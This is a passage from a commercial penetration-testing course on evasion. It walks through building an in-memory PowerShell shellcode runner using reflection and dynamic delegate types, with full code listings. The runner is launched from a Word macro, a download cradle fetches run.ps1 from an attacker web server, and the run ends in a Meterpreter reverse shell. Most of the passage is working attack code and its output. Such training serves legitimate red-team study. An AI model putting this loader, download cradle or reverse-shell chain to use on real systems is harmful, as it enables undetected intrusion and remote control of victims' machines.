OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
83 
 
With the invocation of GetModuleHandle and the resulting correct DLL base address, we gain 
more confidence that this avenue will lead to a usable result. Next we need to locate 
GetProcAddress to resolve arbitrary APIs. 
We’ll use reflection through GetMethod to locate GetProcAddress like we did for 
GetModuleHandle. We’ll again use GetMethod on the $unsafeObj variable that contains the 
reference to Win32.UnsafeNativeMethods in System.dll. Unfortunately, it ends up as an exception 
with an error message of: “Ambiguous match found” as shown in Listing 77. 
PS C:\Windows\SysWOW64\WindowsPowerShell\v1.0> $GetProcAddress = 
$unsafeObj.GetMethod('GetProcAddress') 
Exception calling "GetMethod" with "1" argument(s): "Ambiguous match found." 
At line:1 char:1 
+ $GetProcAddress = $unsafeObj.GetMethod('GetProcAddress') 
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException 
    + FullyQualifiedErrorId : AmbiguousMatchException 
Listing 77 - Error when trying to locate GetProcAddress 
The error message tells us exactly what the problem is. There are multiple instances of 
GetProcAddress within Microsoft.Win32.UnsafeNativeMethods. So, instead of GetMethod, we can 
use GetMethods153 to obtain all methods in Microsoft.Win32.UnsafeNativeMethods and then filter 
to only print those called GetProcAddress. This command and subsequent output is shown in 
Listing 78. 
The filtering is done by a ForEach-Object loop with a comparison condition on the Name property 
of the method. If the output matches GetProcAddress, it is printed. This will reveal each 
occurrence of GetProcAddress inside Microsoft.Win32.UnsafeNativeMethods. 
PS C:\Windows\SysWOW64\WindowsPowerShell\v1.0> $unsafeObj.GetMethods() | ForEach-
Object {If($_.Name -eq "GetProcAddress") {$_}} 
 
 
Name                       : GetProcAddress 
DeclaringType              : Microsoft.Win32.UnsafeNativeMethods 
ReflectedType              : Microsoft.Win32.UnsafeNativeMethods 
MemberType                 : Method 
MetadataToken              : 100663839 
Module                     : System.dll 
IsSecurityCritical         : True 
IsSecuritySafeCritical     : True 
IsSecurityTransparent      : False 
MethodHandle               : System.RuntimeMethodHandle 
Attributes                 : PrivateScope, Public, Static, HideBySig, PinvokeImpl 
CallingConvention          : Standard 
ReturnType                 : System.IntPtr 
... 
 
Name                       : GetProcAddress 
DeclaringType              : Microsoft.Win32.UnsafeNativeMethods 
 
153 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.type.getmethods?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
84 
ReflectedType              : Microsoft.Win32.UnsafeNativeMethods 
MemberType                 : Method 
MetadataToken              : 100663864 
Module                     : System.dll 
IsSecurityCritical         : True 
IsSecuritySafeCritical     : True 
IsSecurityTransparent      : False 
MethodHandle               : System.RuntimeMethodHandle 
Attributes                 : PrivateScope, Public, Static, HideBySig, PinvokeImpl 
CallingConvention          : Standard 
ReturnType                 : System.IntPtr 
... 
Listing 78 - Using Methods to locate all instances of GetProcAddress 
With two results, we can simply create an array to hold both instances and then use the first to 
resolve the function’s address, which in our case is MessageBoxA. We’ll accomplish this with the 
code in Listing 79. 
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll")) 
$tmp=@() 
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
$GetProcAddress = $tmp[0] 
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA")) 
Listing 79 - Resolving the address of MessageBoxA 
In this code, $user32 contains the previously-found base address of user32.dll. We create an 
empty array to store both GetProcAddress instances, after which we repeat the ForEach-Object 
loop to search Microsoft.Win32.UnsafeNativeMethods and locate them. Once found, they are 
appended to the array. 
We’ll assign the first element of the array to the $GetProcAddress variable and we can now use 
that to find the location of MessageBoxA through the Invoke method. Since the C version of 
GetProcAddress takes both the base address of the DLL and the name of the function, we supply 
both of these as arguments in the array. 
In versions of Windows 10 prior to 1803, only one instance of GetProcAddress 
was present in Microsoft.Win32.UnsafeNativeMethods. In future versions of 
Windows 10 this could change again. The same goes for GetModuleHandle. 
Let’s execute this to find out if it works. 
PS C:\Windows\SysWOW64\WindowsPowerShell\v1.0> $systemdll = 
([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {  
  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }) 
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods') 
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle') 
 
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll")) 
$tmp=@() 
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
$GetProcAddress = $tmp[0] 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
85 
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA")) 
 
1974017664 
Listing 80 - Address of MessageBoxA is found 
When we execute the function, it reveals a decimal value, which, when translated to hexadecimal 
(0x75A91E80) appears to be inside user32.dll. It appears our efforts have paid off. We have 
resolved the address of an arbitrary Win32 API. 
Now, to make our code more portable and compact it is worth rewriting the PowerShell script into 
a method. This will allow us to reference it multiple times. The converted function is shown in 
Listing 81. 
function LookupFunc { 
 
    Param ($moduleName, $functionName) 
 
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |  
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1]. 
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') 
    $tmp=@() 
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName)) 
} 
Listing 81 - Lookup function to resolve any Win32 API 
With the techniques developed in this section, we have managed to implement a function that 
can resolve any Win32 API without using the Add-Type keyword. This completely avoids writing to 
the hard disk. 
In the next section, we must match the address of the Win32 API that we have located with its 
arguments and return values. 
3.6.2.1 Exercises 
1. 
Go through the PowerShell code in this section and dump the wanted methods to disclose 
the location of GetModuleHandle and GetProcAddress and perform a lookup of a different 
Win32 API. 
2. 
What happens if we use the second entry in the $tmp array? 
3.6.3 DelegateType Reflection 
Now that we can resolve addresses of the Win32 APIs, we must define the argument types. 
The information about the number of arguments and their associated data types must be paired 
with 
the 
resolved 
function 
memory 
address. 
In 
C# 
this 
is 
done 
using 
the 
GetDelegateForFunctionPointer154 method. This method takes two arguments, first the memory 
address of the function, and second the function prototype represented as a type. 
 
154 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
86 
In C#, a function prototype is known as a Delegate155 or delegate type. A declaration creating the 
delegate type in C# for MessageBox is given in Listing 82. 
int delegate MessageBoxSig(IntPtr hWnd, String text, String caption, int options); 
Listing 82 - Declaring function prototype in C# 
Unfortunately, there is no equivalent to the delegate keyword in PowerShell so we must obtain 
this in a different manner. Luckily, Microsoft described how a delegate type may be created using 
reflection in an old blog post from 2004.156 
As we know from our usage of Add-Type, the delegate type is created when the assembly is 
compiled, but instead we will manually create an assembly in memory and populate it with 
content.157 
The first step is to create a new assembly object through the AssemblyName158 class and assign 
it a name like ReflectedDelegate. We do this by creating a new variable called $MyAssembly and 
setting it to the instantiated assembly object with the name “ReflectedDelegate”: 
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate') 
Listing 83 - Creating a custom assembly object in memory 
Before we populate the assembly, we must configure its access mode. This is an important 
permission, because we want it to be executable and not saved to disk. This can be achieved 
through the DefineDynamicAssembly159 method, first by supplying the custom assembly name. 
Then we set it as executable by supplying the Run160 access mode value defined in the 
System.Reflection.Emit.AssemblyBuilderAccess namespace as the second argument. 
$Domain = [AppDomain]::CurrentDomain 
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly,  
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run) 
Listing 84 - Setting the access mode of the assembly to Run 
With permissions set on the assembly, we can start creating content. Inside an assembly, the 
main building block is a Module. We can create this Module through the DefineDynamicModule161 
method. We supply a custom name for the module and tell it not to include symbol information. 
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false) 
Listing 85 - Creating a custom module inside the assembly 
Now we can create a custom type that will become our delegate type. We can do this within the 
module, using the DefineType method.162 
 
155 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/ 
156 (Microsoft, 2004), https://blogs.msdn.microsoft.com/joelpob/2004/02/15/creating-delegate-types-via-reflection-emit/ 
157 (Exploit Monday, 2012), http://www.exploit-monday.com/2012_05_13_archive.html 
158 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assemblyname?view=netframework-4.8 
159 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.emit.assemblybuilder.definedynamicassembly?view=netframework-4.8 
160 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.emit.assemblybuilderaccess?view=netframework-4.8 
161 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.emit.assemblybuilder.definedynamicmodule?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
87 
To do this, we need to set three arguments. The first is the custom name, in our case 
MyDelegateType. The second is the combined list of attributes for the type.163 In our case, we 
must specify the type to be a class (so we can later instantiate it), public, non-extendable, and use 
ASCII instead of Unicode. Finally, it is set to be interpreted automatically since our testing found 
that this undocumented setting was required. The attributes then become Class, Public, Sealed, 
AnsiClass, and AutoClass. 
As a third argument, we must specify the type it builds on top of. We choose the 
MulticastDelegate class164 to create a delegate type with multiple entries which will allow us to 
call the target API with multiple arguments. 
Here is the code for defining the custom type: 
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType',  
  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) 
Listing 86 - Creating a custom type in the assembly 
Finally, we are ready to put the function prototype inside the type and let it become our custom 
delegate type. This process is shown in Listing 87: 
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor( 
  'RTSpecialName, HideBySig, Public',  
    [System.Reflection.CallingConventions]::Standard,  
      @([IntPtr], [String], [String], [int])) 
Listing 87 - Creating a constructor for the custom delegate type 
First, we define the constructor through the DefineConstructor165 method, which takes three 
arguments. 
The first argument contains the attributes of the constructor itself, defined through 
MethodAttributes Enum.166 Here we must make it public and require it to be referenced by both 
name and signature. To do this, we choose RTSpecialName, HideBySig, and Public. 
The second argument is the calling convention for the constructor, which defines how arguments 
and return values are handled by the .NET framework. In our case, we choose the default calling 
convention by specifying the enum value [System.Reflection.CallingConventions]::Standard.167 
In the last argument, we come to the crux of our work. We finally get to define the parameter 
types of the constructor that will become the function prototype. 
 
162 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.emit.modulebuilder.definetype?view=netframework-
4.8#System_Reflection_Emit_ModuleBuilder_DefineType_System_String_System_Reflection_TypeAttributes_ 
163 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.typeattributes?view=netframework-4.8 
164 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.multicastdelegate?view=netframework-4.8 
165 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.emit.typebuilder.defineconstructor?view=netframework-4.8 
166 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.methodattributes?view=netframework-4.8 
167 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.callingconventions?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
88 
The complete call to DefineConstructor combines the constructor attributes, the calling 
convention for the constructor, and the function arguments for MessageBoxA that we have seen 
earlier in the module given as an array. 
With the constructor created, we must call it. But before we can do that, we must set a couple of 
implementation flags with the SetImplementationFlags168 method using values outlined in 
MethodImplAttributes Enum.169 We choose Runtime and Managed since it is used at runtime and 
the code is managed code. 
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed') 
Listing 88 - Setting implementation flags for the constructor 
The constructor is now ready to be called. But to actually tell the .NET framework the delegate 
type to be used in calling a function, we have to define the Invoke method as shown in Listing 89. 
We’ll use DefineMethod170 to create and specify the settings for the Invoke method. 
DefineMethod takes four arguments. The first is the name of the method to define, which in our 
case is “Invoke”. The second argument includes method attributes taken from the 
MethodAttributes Enum.171 In our case, we choose Public to make it accessible, HideBySig to allow 
it to be called by both name and signature, NewSlot, and Virtual to indicate that the method is 
virtual and ensure that it always gets a new slot in the vtable. 
As the third argument, we specify the return type of the function, which for MessageBoxA is [int]. 
The fourth argument is an array of argument types that we already identified when we first 
introduced MessageBox. 
The setup of the Invoke method puts together the four arguments described above and supplies 
them to DefineMethod as given in Listing 89. 
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke',  
  'Public, HideBySig, NewSlot, Virtual',  
    [int],  
      @([IntPtr], [String], [String], [int])) 
Listing 89 - Defining and configuring the Invoke method 
Just as with the constructor, we must set the implementation flags to allow the Invoke method to 
be called. This is done after it is defined through the SetImplementationFlags method. 
To instantiate the delegate type, we call our custom constructor through the CreateType172 
method. 
$MyDelegateType = $MyTypeBuilder.CreateType() 
Listing 90 - Calling the constructor on the delegate type 
 
168 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.emit.constructorbuilder.setimplementationflags?view=netframework-4.8 
169 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.methodimplattributes?view=netframework-4.8 
170 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.emit.typebuilder.definemethod?view=netframework-4.8 
171 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.methodattributes?view=netframework-4.8 
172 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.emit.typebuilder.createtype?view=netframework-
4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
89 
After 
all 
this 
effort, 
we 
finally 
have 
a 
delegate 
type 
to 
use 
in 
our 
call 
to 
GetDelegateForFunctionPointer. Combining all the pieces along with the resolved memory 
address of MessageBoxA, we can call a Win32 native API without using Add-Type. 
Now that we have explained every part of the code, let’s review the final code (shown in Listing 
91). 
In review, we repeat the LookupFunc method that resolves the Win32 API address and use that to 
locate the address of MessageBoxA. Then we create the DelegateType. Finally, we call 
GetDelegateForFunctionPointer to link the function address and the DelegateType and invoke 
MessageBox. 
function LookupFunc { 
 
    Param ($moduleName, $functionName) 
 
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |  
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1]. 
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') 
    $tmp=@() 
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName)) 
} 
 
$MessageBoxA = LookupFunc user32.dll MessageBoxA 
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate') 
$Domain = [AppDomain]::CurrentDomain 
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly,  
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run) 
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false) 
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType',  
  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) 
 
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor( 
  'RTSpecialName, HideBySig, Public',  
    [System.Reflection.CallingConventions]::Standard,  
      @([IntPtr], [String], [String], [int])) 
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed') 
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke',  
  'Public, HideBySig, NewSlot, Virtual',  
    [int],  
      @([IntPtr], [String], [String], [int])) 
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed') 
$MyDelegateType = $MyTypeBuilder.CreateType() 
 
$MyFunction = [System.Runtime.InteropServices.Marshal]:: 
    GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType) 
$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0) 
Listing 91 - Using reflection to call a Win32 API without Add-Type 
Execution of this code yields a simple “Hello World” prompt showing our success. The final piece 
remaining now is to use our newly developed technique to create a shellcode runner and 
eventually execute it through our Word macro. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
90 
3.6.3.1 Exercises 
1. 
Use the PowerShell code to call MessageBoxA using reflection instead of Add-Type. 
2. 
Use Process Monitor to verify that no C# source code is written to disk or compiled. 
3. 
The Win32 WinExec API can be used to launch applications. Modify the existing code to 
resolve and call WinExec and open Notepad. Use resources such as MSDN and P/Invoke to 
understand the arguments for the function and the associated data types. 
3.6.4 Reflection Shellcode Runner in PowerShell 
With the power of the reflection technique in PowerShell, we now have the ability to invoke Win32 
APIs from code that executes entirely in memory. We must now translate our simple “Hello 
World” proof-of-concept into a full-fledged shellcode runner. 
Since we are going to call three different Win32 APIs (VirtualAlloc, CreateThread, and 
WaitForSingleObject), we’ll rewrite the portion of code that creates the delegate type into a 
function so we can easily call it multiple times. 
We’ll also slim down the code, eliminating unneeded variables to produce the smallest and most 
efficient code possible. 
The resulting function is called getDelegateType and accepts two arguments: the function 
arguments of the Win32 API given as an array and its return type. Our previous code is built into 
three blocks. The first block creates the custom assembly and defines the module and type inside 
of it. The second block of code sets up the constructor, and the third sets up the invoke method. 
Finally, the constructor is invoked and the delegate type is returned to the caller. The complete 
code is shown in Listing 92. 
function getDelegateType { 
 
    Param ( 
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, 
        [Parameter(Position = 1)] [Type] $delType = [Void] 
    ) 
 
    $type = [AppDomain]::CurrentDomain. 
    DefineDynamicAssembly((New-Object 
System.Reflection.AssemblyName('ReflectedDelegate')),  
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run). 
      DefineDynamicModule('InMemoryModule', $false). 
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',  
      [System.MulticastDelegate]) 
 
  $type. 
    DefineConstructor('RTSpecialName, HideBySig, Public', 
[System.Reflection.CallingConventions]::Standard, $func). 
      SetImplementationFlags('Runtime, Managed') 
 
  $type. 
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func). 
      SetImplementationFlags('Runtime, Managed') 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
91 
    return $type.CreateType() 
} 
Listing 92 - Method wrapper to create a delegate type 
Together with LookupFunc, we’ll resolve and call VirtualAlloc using the same arguments as in the 
previous cases. We’ll use LookupFunc to search Kernel32.dll for the Win32 VirtualAlloc API. This 
code is shown in Listing 93. 
$VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc 
$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) 
([IntPtr]) 
$VirtualAlloc = 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocA
ddr, $VirtualAllocDelegateType) 
$VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40) 
Listing 93 - Resolving and calling VirtualAlloc through reflection 
The code shown in Listing 93 uses our LookupFunc and getDelegateType functions to allocate a 
memory buffer. While the code works, it is possible to optimize and condense it to remove 
unneeded variables. 
This optimized version (Listing 94) embeds the calls to LookupFunc and getDelegateType in the 
call to GetDelegateForFunctionPointer. 
$lpMem = 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) 
([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40) 
Listing 94 - Condensed version of resolving and calling VirtualAlloc 
The next step is to generate the shellcode in ps1 format, remembering to choose 32-bit 
architecture due to PowerShell spawning as a 32-bit child process of Word. With the shellcode 
generated, we can copy it using the .NET Copy method: 
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0... 
 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length) 
Listing 95 - 32-bit shellcode and .NET Copy method 
The shellcode and copy operation are identical to the version for the Add-Type version of our 
shellcode runner. Next, we can create a thread and call WaitForSingleObject to block PowerShell 
from terminating. 
VirtualAlloc, CreateThread, and WaitForSingleObject are all resolved and called in exactly the same 
manner with our the condensed syntax. Omitting the LookupFunc and getDelegateType functions, 
the full shellcode runner is given in Listing 96. 
$lpMem = 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) 
([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40) 
 
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0... 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
92 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length) 
 
$hThread = 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], 
[UInt32], [IntPtr]) 
([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero) 
 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) 
([Int]))).Invoke($hThread, 0xFFFFFFFF) 
Listing 96 - PowerShell reflection based shellcode runner 
The complete code is listed below. 
function LookupFunc { 
 
    Param ($moduleName, $functionName) 
 
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |  
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1]. 
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') 
    $tmp=@() 
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName)) 
} 
 
function getDelegateType { 
 
    Param ( 
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, 
        [Parameter(Position = 1)] [Type] $delType = [Void] 
    ) 
 
    $type = [AppDomain]::CurrentDomain. 
    DefineDynamicAssembly((New-Object 
System.Reflection.AssemblyName('ReflectedDelegate')),  
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run). 
      DefineDynamicModule('InMemoryModule', $false). 
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',  
      [System.MulticastDelegate]) 
 
  $type. 
    DefineConstructor('RTSpecialName, HideBySig, Public', 
[System.Reflection.CallingConventions]::Standard, $func). 
      SetImplementationFlags('Runtime, Managed') 
 
  $type. 
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func). 
      SetImplementationFlags('Runtime, Managed') 
 
    return $type.CreateType() 
} 
 
$lpMem = 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
93 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) 
([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40) 
 
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0... 
 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length) 
 
$hThread = 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], 
[UInt32], [IntPtr]) 
([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero) 
 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) 
([Int]))).Invoke($hThread, 0xFFFFFFFF) 
Listing 97 - Complete PowerShell script for in-memory shellcode runner 
Since the shellcode runner code is entirely located on the Kali Linux Apache server, we do not 
need to update the Word macro but will simply overwrite the run.ps1 file on the web server before 
opening the Word document. 
Based on the output in Listing 98, the code is working and we have a reverse shell. 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) 
Staging x86 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678) 
 
meterpreter >  
Listing 98 - Reverse Meterpreter shell executed from the reflective PowerShell shellcode runner 
In addition, Process Monitor reveals that no .cs file was written to the file system and 
subsequently compiled as given in Figure 28. 
 
Figure 28: Process Monitor showing that no .cs files were written to disk and compiled 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
94 
 
Excellent. We’ve created a PowerShell shellcode runner that executes entirely in-memory. In 
addition, it can be triggered from VBA without embedding any first stage shellcode inside the 
Macro. 
In the next section, we’ll discuss network proxies, which can create various issues when 
performing this type of attack. 
3.6.4.1 Exercises 
1. 
Generate a Meterpreter shellcode and obtain an in-memory PowerShell shellcode runner 
resulting in a reverse shell. 
2. 
The code developed in this section was based on a 32-bit PowerShell process. Identify and 
modify needed elements to make this work from a 64-bit PowerShell process. 
3.7 Talking To The Proxy 
Let’s take a moment to talk about proxies and the part they can play in a penetration test. 
Many organizations and enterprises force their network communication through a proxy, which 
can allow security analysts to monitor traffic. In these cases, penetration testers must either 
ensure that their techniques work through the proxy or if possible, bypass the proxy and its 
associated monitoring, depending on the situation. 
The Meterpreter HTTP and HTTPS payloads are proxy-aware,173 but our PowerShell download 
cradles may not be. It’s always best to check for ourselves. 
3.7.1 PowerShell Proxy-Aware Communication 
In this module, we have primarily used the Net.WebClient download cradle. This class is, by 
default, proxy-aware. This has not always been the case174 and this feature may revert in future 
versions of Windows, but at least for now, it is proxy-aware. 
To validate this, we’ll first set the proxy settings of the Windows 10 victim client to match that of 
the Windows 10 development client, which is running the Squid175 proxy software. 
To set up the proxy on our machine, we’ll right-click on the Windows Start icon and navigate to 
Settings > Network & Internet > Proxy, and scroll down to “Manual proxy setup”. 
We’ll enable the proxy server and enter the IP address of the Windows 10 development client 
(192.168.120.12 in our case) and the static TCP port 3128. Finally, we’ll click Save and close the 
settings menu. 
We can observe the proxy in action by opening PowerShell ISE and executing the two-line 
PowerShell download cradle shown in Listing 99. 
 
173 (Rapid7, 2011), https://blog.rapid7.com/2011/06/29/meterpreter-httphttps-communication/ 
174 (Windows OS Hub, 2017), http://woshub.com/using-powershell-behind-a-proxy/ 
175 (Squid, 2013), http://www.squid-cache.org/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
95 
First we need to make sure we have our web server running and that we have our run.ps1 
PowerShell file waiting. 
$wc = new-object system.net.WebClient 
$wc.DownloadString("http://192.168.119.120/run.ps1") 
Listing 99 - Net.WebClient download cradle going through the proxy 
Running the PowerShell code does not generate any errors. If we switch to Kali and dump the 
latest entry from the Apache access logs, we’ll find a request for run.ps1 coming from our 
Windows 10 development client on IP address 192.168.120.12 running the proxy server. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
... 
192.168.120.12 - - [09/Jun/2020:08:06:08 -0400] "GET /run.ps1 HTTP/1.1" 200 4360 "-" 
"-" 
Listing 100 - HTTP request coming from the proxy server IP address 
Since our Windows 10 victim client is at 192.168.120.11, it seems the proxy is, in fact, working. 
The proxy settings used by Net.WebClient are stored in the .proxy property and are populated 
from the DefaultWebProxy176 property when creating the object. We can view these settings using 
the GetProxy177 method by specifying the URL to test against. 
